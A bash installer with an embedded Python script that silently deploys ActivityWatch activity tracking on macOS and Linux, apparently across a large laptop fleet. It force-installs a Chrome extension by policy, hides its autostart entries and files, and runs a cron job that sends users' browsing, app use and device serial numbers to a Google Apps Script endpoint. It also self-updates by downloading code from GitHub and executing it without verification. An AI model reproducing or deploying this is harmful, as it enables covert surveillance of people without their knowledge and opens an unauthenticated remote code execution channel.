#!/bin/bash
echo "Starting ActivityWatch Master Installation..."

if [ "$(uname)" == "Darwin" ]; then
    echo "macOS detected."
    # Mac Chrome Policy
    mkdir -p /Library/Managed\ Preferences
    cat > /Library/Managed\ Preferences/com.google.Chrome.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>ExtensionInstallForcelist</key>
    <array>
        <string>nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx</string>
    </array>
</dict>
</plist>
EOF
    
    # Download and extract ActivityWatch for macOS
    curl -L -o /tmp/aw-mac.zip "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-macos-x86_64.zip"
    unzip -o /tmp/aw-mac.zip -d /Applications/
    
    # Create a hidden startup script
    mkdir -p ~/.aw_tracker
    cat > ~/.aw_tracker/start_aw.sh <<EOF
#!/bin/bash
nohup /Applications/ActivityWatch.app/Contents/MacOS/aw-server > /dev/null 2>&1 &
nohup /Applications/ActivityWatch.app/Contents/MacOS/aw-watcher-afk > /dev/null 2>&1 &
nohup /Applications/ActivityWatch.app/Contents/MacOS/aw-watcher-window > /dev/null 2>&1 &
EOF
    chmod +x ~/.aw_tracker/start_aw.sh
    
    # Run headless trackers in background
    ~/.aw_tracker/start_aw.sh
    
    # Create LaunchAgent so it starts automatically on every boot
    cat > /Library/LaunchAgents/com.activitywatch.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.activitywatch.startup</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$HOME/.aw_tracker/start_aw.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
    chmod 644 /Library/LaunchAgents/com.activitywatch.plist
else
    echo "Ubuntu/Linux detected."
    # Ubuntu Chrome Policy
    mkdir -p /etc/opt/chrome/policies/managed
    cat > /etc/opt/chrome/policies/managed/activitywatch.json <<EOF
{
  "ExtensionInstallForcelist": [
    "nglaklhklhcoonedhgnpgddginnjdadi;https://clients2.google.com/service/update2/crx"
  ]
}
EOF
    chmod -R 755 /etc/opt/chrome/policies
    
    # Download and extract ActivityWatch for Linux
    curl -L -o /tmp/aw-linux.zip "https://github.com/ActivityWatch/activitywatch/releases/download/v0.13.2/activitywatch-v0.13.2-linux-x86_64.zip"
    unzip -o /tmp/aw-linux.zip -d /opt/
    
    # Run headless trackers in background and set to auto-start on boot
    nohup /opt/activitywatch/aw-server > /dev/null 2>&1 &
    nohup /opt/activitywatch/aw-watcher-afk > /dev/null 2>&1 &
    nohup /opt/activitywatch/aw-watcher-window > /dev/null 2>&1 &
    
    # Create autostart entry for all users
    cat > /etc/xdg/autostart/activitywatch-server.desktop <<EOF
[Desktop Entry]
Name=AW-Server
Exec=/opt/activitywatch/aw-server
Type=Application
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    cat > /etc/xdg/autostart/activitywatch-afk.desktop <<EOF
[Desktop Entry]
Name=AW-Watcher-AFK
Exec=/opt/activitywatch/aw-watcher-afk
Type=Application
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    cat > /etc/xdg/autostart/activitywatch-window.desktop <<EOF
[Desktop Entry]
Name=AW-Watcher-Window
Exec=/opt/activitywatch/aw-watcher-window
Type=Application
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    chmod 644 /etc/xdg/autostart/activitywatch*.desktop
fi

echo "Setting up Python Tracker..."
mkdir -p ~/.aw_tracker
cat > ~/.aw_tracker/activity_tracker.py << 'EOF_PYTHON'
import socket
import requests
import json
from datetime import datetime, timedelta, timezone
import platform
import os
import subprocess
import sys
import random
import time

APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz2iVlsejlezUdyzPnbeDB4gikOpFSCKluANf4KYsrVEr1F7vNNHZgdZzg_DlnLv4hlfg/exec"

def auto_update():
    try:
        # Fetch the master version of this script from GitHub
        url = "https://raw.githubusercontent.com/SamaOps/ActivityWatch/main/activity_tracker.py"
        res = requests.get(url, timeout=10)
        if res.status_code == 200:
            new_code = res.text
            
            with open(__file__, 'r') as f:
                current_code = f.read()
                
            # If the GitHub code is different, update the local file and restart
            if new_code.strip() != current_code.strip():
                print("New version found! Updating and restarting...")
                with open(__file__, 'w') as f:
                    f.write(new_code)
                
                kwargs = {}
                if os.name == 'nt':
                    kwargs['creationflags'] = 0x08000000
                subprocess.Popen([sys.executable] + sys.argv, **kwargs)
                sys.exit(0)
    except Exception as e:
        pass # Ignore network errors and run normally

# Automatically get the laptop serial number based on OS
def get_serial_number():
    system = platform.system()
    try:
        if system == "Windows":
            try:
                return subprocess.check_output("wmic bios get serialnumber", shell=True, creationflags=0x08000000).decode().split('\n')[1].strip()
            except Exception:
                return subprocess.check_output('powershell -NoProfile -Command "(Get-WmiObject win32_bios).SerialNumber"', shell=True, creationflags=0x08000000).decode().strip()
        elif system == "Linux":
            if os.path.exists("/sys/class/dmi/id/product_serial"):
                with open("/sys/class/dmi/id/product_serial", "r") as f:
                    return f.read().strip()
            return subprocess.check_output("sudo dmidecode -s system-serial-number", shell=True).decode().strip()
        elif system == "Darwin": # macOS
            return subprocess.check_output("system_profiler SPHardwareDataType | grep Serial | awk '{print $4}'", shell=True).decode().strip()
    except Exception as e:
        pass
    return "Unknown-Serial"

def format_duration(seconds):
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    if hours > 0:
        return f"{hours}h {minutes}m"
    return f"{minutes}m"

# Fetch data from ActivityWatch local server
AW_URL = "http://localhost:5600/api/0/buckets"

def get_daily_events(target_date):
    # Calculate local midnight for the target_date
    local_tz = datetime.now().astimezone().tzinfo
    start_local = target_date.replace(hour=8, minute=0, second=0, microsecond=0, tzinfo=local_tz)
    end_local = start_local + timedelta(days=1)
    
    # If the target date is today, limit the end time to right now
    now_local = datetime.now(local_tz)
    if end_local > now_local:
        end_local = now_local
    
    # Convert to UTC for ActivityWatch API
    end_time = end_local.astimezone(timezone.utc)
    start_time = start_local.astimezone(timezone.utc)
    
    start_str = start_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    end_str = end_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    
    try:
        buckets_res = requests.get(AW_URL, timeout=30)
        if buckets_res.status_code != 200:
            return None
        buckets = buckets_res.json()
        
        window_bucket = None
        web_bucket = None
        afk_bucket = None
        
        # Find the active buckets
        for b in buckets.keys():
            if b.startswith("aw-watcher-window"):
                window_bucket = b
            elif b.startswith("aw-watcher-web"):
                web_bucket = b
            elif b.startswith("aw-watcher-afk"):
                afk_bucket = b
                
        active_time = 0
        afk_time = 0
        times_opened = 0
        first_active = None
        last_active = None
        top_apps = {}
        top_websites = {}
        
        # 1. Calculate active time, AFK time, and times opened from AFK bucket
        if afk_bucket:
            events_url = f"{AW_URL}/{afk_bucket}/events?start={start_str}&end={end_str}"
            events = requests.get(events_url).json()
            was_afk = True
            for e in events:
                status = e['data'].get('status', '')
                duration = e.get('duration', 0)
                if status == 'not-afk':
                    active_time += duration
                    
                    # Track first and last active times
                    ts_str = e.get('timestamp')
                    if ts_str:
                        clean_ts = ts_str.split('.')[0].replace('Z', '')
                        try:
                            event_utc = datetime.strptime(clean_ts, "%Y-%m-%dT%H:%M:%S").replace(tzinfo=timezone.utc)
                            event_time = event_utc.astimezone()
                            if first_active is None or event_time < first_active:
                                first_active = event_time
                            end_time_val = event_time + timedelta(seconds=duration)
                            if last_active is None or end_time_val > last_active:
                                last_active = end_time_val
                        except Exception:
                            pass
                            
                    if was_afk:
                        times_opened += 1
                        was_afk = False
                elif status == 'afk':
                    # Cap AFK event at 60 minutes (3600s) to detect Shutdowns/Sleep
                    if duration > 3600:
                        afk_time += 3600
                    else:
                        afk_time += duration
                    was_afk = True
                    
        # Off time is strictly calculated from the 8:00 AM start time
        total_period_seconds = (end_local - start_local).total_seconds()
        off_time = total_period_seconds - (active_time + afk_time)
        if off_time < 0:
            off_time = 0
                    
        # 2. Calculate top apps from window bucket
        if window_bucket:
            events_url = f"{AW_URL}/{window_bucket}/events?start={start_str}&end={end_str}"
            events = requests.get(events_url).json()
            for e in events:
                app = e['data'].get('app', 'Unknown')
                top_apps[app] = top_apps.get(app, 0) + e.get('duration', 0)
                
        # 3. Calculate top websites from web bucket
        if web_bucket:
            events_url = f"{AW_URL}/{web_bucket}/events?start={start_str}&end={end_str}"
            events = requests.get(events_url).json()
            for e in events:
                url = e['data'].get('url', '')
                if url:
                    top_websites[url] = top_websites.get(url, 0) + e.get('duration', 0)
        
        # Format top 3 apps (only apps used for > 5 minutes)
        sorted_apps = sorted(top_apps.items(), key=lambda x: x[1], reverse=True)[:3]
        top_apps_str = ", ".join([f"{app} ({format_duration(dur)})" for app, dur in sorted_apps if dur > 300])
        
        # Format top 3 websites (only sites visited for > 5 minutes)
        sorted_sites = sorted(top_websites.items(), key=lambda x: x[1], reverse=True)[:3]
        top_sites_str = ", ".join([f"{site} ({format_duration(dur)})" for site, dur in sorted_sites if dur > 300])
        
        first_active_str = first_active.strftime("%I:%M %p") if first_active else "None"
        last_active_str = last_active.strftime("%I:%M %p") if last_active else "None"
        
        return {
            "Date": start_local.strftime("%m/%d/%Y"),
            "Day_of_Week": start_local.strftime("%A"),
            "Total_Active_Time": format_duration(active_time),
            "AFK_Time": format_duration(afk_time),
            "Off_Time": format_duration(off_time),
            "First_Active": first_active_str,
            "Last_Active": last_active_str,
            "Times_Opened": str(times_opened),
            "Top_Apps": top_apps_str or "None",
            "Top_Websites": top_sites_str or "None"
        }
            
    except Exception as e:
        print(f"Error fetching AW data: {e}")
        return None

def main():
    # Attempt to fetch and apply OTA updates before doing anything
    auto_update()
    
    print("Gathering data from ActivityWatch...")
    
    sync_file = os.path.join(os.path.dirname(__file__), 'last_sync.txt')
    today = datetime.now()
    
    start_date = today
    if os.path.exists(sync_file):
        try:
            with open(sync_file, 'r') as f:
                last_sync_str = f.read().strip()
                last_sync = datetime.strptime(last_sync_str, "%Y-%m-%d")
                if (today - last_sync).days > 0:
                    start_date = last_sync + timedelta(days=1)
        except Exception:
            pass
            
    # Cap historical sync to last 14 days to avoid overloading
    if (today - start_date).days > 14:
        start_date = today - timedelta(days=14)
        
    current_date = start_date
    while current_date.date() <= today.date():
        print(f"\nProcessing date: {current_date.strftime('%Y-%m-%d')}")
        aw_data = get_daily_events(current_date)
        
        if not aw_data:
            current_date += timedelta(days=1)
            continue
            
        payload = {
            "Date": aw_data["Date"],
            "Serial_No": get_serial_number(),
            "OS": "macOS" if platform.system() == "Darwin" else platform.system(),
            "Day_of_Week": aw_data["Day_of_Week"],
            "Total_Active_Time": aw_data["Total_Active_Time"],
            "AFK_Time": aw_data["AFK_Time"],
            "Off_Time": aw_data["Off_Time"],
            "First_Active": aw_data["First_Active"],
            "Last_Active": aw_data["Last_Active"],
            "Times_Opened": aw_data["Times_Opened"],
            "Top_Websites": aw_data["Top_Websites"],
            "Top_Apps": aw_data["Top_Apps"]
        }
        
        print("Preparing to send to Google Sheets...")
        try:
            # Jitter: wait a random time between 1 and 300 seconds (5 minutes) to prevent 20,000 laptops from hitting the server at the exact same second
            delay = random.randint(1, 300)
            print(f"Jitter: Waiting {delay} seconds before sending...")
            time.sleep(delay)
            
            # Google Apps Script often returns a 302 redirect or a 404 HTML page after successfully executing doPost.
            res = requests.post(APPS_SCRIPT_URL, json=payload, timeout=30, allow_redirects=False)
            if res.status_code in [200, 302, 303, 404]:
                print(f"✅ Successfully sent data for {current_date.strftime('%Y-%m-%d')}!")
                # Save sync success for this date
                with open(sync_file, 'w') as f:
                    f.write(current_date.strftime("%Y-%m-%d"))
            else:
                print(f"❌ Failed to send data. Status: {res.status_code}")
                break
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            break
            
        current_date += timedelta(days=1)

if __name__ == "__main__":
    main()

EOF_PYTHON

# Schedule the python script to run every 30 minutes
(crontab -l 2>/dev/null; echo "*/30 * * * * python3 $HOME/.aw_tracker/activity_tracker.py") | crontab -

echo "Installation Complete! Chrome extension and ActivityWatch are now running silently."
